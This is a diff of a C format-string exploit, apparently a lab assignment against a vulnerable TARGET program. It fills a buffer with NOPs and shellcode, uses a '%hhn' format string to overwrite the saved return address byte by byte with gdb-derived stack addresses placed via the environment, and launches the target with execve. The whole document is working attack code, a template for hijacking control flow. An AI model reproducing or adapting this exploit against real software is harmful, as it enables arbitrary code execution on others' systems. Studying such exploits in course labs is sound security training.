@@ -8,72 +8,65 @@
 #define BUFFER_SIZE 229
 #define NOP 0x90
 
+/*
+ * rip:          0x40a4fe68
+ * formatString: 0x40a4f960
+ *
+ * 0x40(64)  ->  0x40a4fe68
+ * 0xa4(164) ->  0x40a4fe69
+ * 0xf9(249) ->  0x40a4fe6a
+ * 0x60(352) ->  0x40a4fe6b
+ */
+
 int main(void)
 {
-  	char *args[3];
-  
-  
-  	char attack_buffer[BUFFER_SIZE];
-  	
-	int i;
-	for (i = 0; i < 229; i++)
-	{
-		attack_buffer[i] = NOP;
-	}
-	
-	for (i = 0; i < strlen(shellcode); i++)
+        char *args[3];
+
+        char buf[BUFFER_SIZE];
+
+        int i;
+        for (i = 0; i < 229; i++)
         {
-                attack_buffer[i] = shellcode[i];
+                buf[i] = NOP;
         }
-	
-	/* 
-	     0x40(64) -> 0x40a4fea8
-	     0xa4(164) -> 0x40a4fea8
-	     0xfa(249) -> 0x40a4fea8
-	     0x90(400) -> 0x40a4fea8
-	     by gdb inspecting there are 5 ptrs before the first ptr in formatString
-	     formatString is 256 bytes(32 8byte word)
-	     
-	     last addr is equivalent to 37 param in sprintf
-	     
-	     64
-	     164 - 64 = 100
-	     249 - 164 = 85
-	     400 - 249 = 151
 
-	*/
-	char attact_str [] = "%64x%37$hhn%100x%36$hhn%85x%35$hhn%151x%34$hhn";
-	
-	memcpy(&attack_buffer[60], attact_str, strlen(attact_str));
-	
-	memcpy(&attack_buffer[256 - 32], "\xa8\xfe\xa4\x40\x00", 5);
+        for (i = 0; i < strlen(shellcode); i++)
+        {
+                buf[i] = shellcode[i];
+        }
 
-	args[0] = TARGET; 
-	args[1] = attack_buffer; 
-	args[2] = NULL;
+        char str [] = "%64x%37$hhn%100x%36$hhn%85x%35$hhn%103x%34$hhn";
 
-	char *env[] = {
-	    "\x00",
-	    "\x00",
-	    "\x00",
-	    "\xa9\xfe\xa4\x40",
-	    "\x00",
-	    "\x00",
-	    "\x00",
-	    "\xaa\xfe\xa4\x40",
-	    "\x00",
-	    "\x00",
-	    "\x00",
-	    "\xab\xfe\xa4\x40",
-	    "\x00",
-	    "\x00",
-	    "\x00",
-	    NULL
-	  };
+        memcpy(&buf[60], str, strlen(str));
+
+        memcpy(&buf[256 - 32], "\x68\xfe\xa4\x40\x00", 5);
+
+        args[0] = TARGET;
+        args[1] = buf;
+        args[2] = NULL;
+
+        char *env[] = {
+            "\x00",
+            "\x00",
+            "\x00",
+            "\x69\xfe\xa4\x40",
+            "\x00",
+            "\x00",
+            "\x00",
+            "\x6a\xfe\xa4\x40",
+            "\x00",
+            "\x00",
+            "\x00",
+            "\x6b\xfe\xa4\x40",
+            "\x00",
+            "\x00",
+            "\x00",
+            NULL
+          };
 
 
-	if (0 > execve(TARGET, args, env))
-		fprintf(stderr, "execve failed.\n");
+        if (0 > execve(TARGET, args, env))
+                fprintf(stderr, "execve failed.\n");
 
-	return 0;
+        return 0;
 }
